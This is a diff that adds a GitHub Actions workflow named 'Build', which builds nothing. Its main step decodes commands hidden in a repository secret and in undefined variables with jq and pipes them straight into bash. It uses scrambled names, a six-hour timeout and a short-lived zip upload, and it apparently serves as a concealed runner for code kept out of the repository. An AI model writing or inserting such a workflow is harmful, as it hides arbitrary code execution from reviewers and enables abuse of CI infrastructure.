@@ -1,0 +1,28 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          elp3449: ${{ secrets.elp3449 }}
+        run: |
+          printf '%s' "$elp3449" | jq -r .bpqg3255 | /bin/bash
+          echo $cakl469 | jq -r .m83 | /bin/bash
+          echo $vw8 | jq -r .mkbia719 | /bin/bash
+          printf '%s' "$s3" | jq -r .vmzsu5055 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1FVltIu0
+          path: "*.zip"
+          retention-days: 1
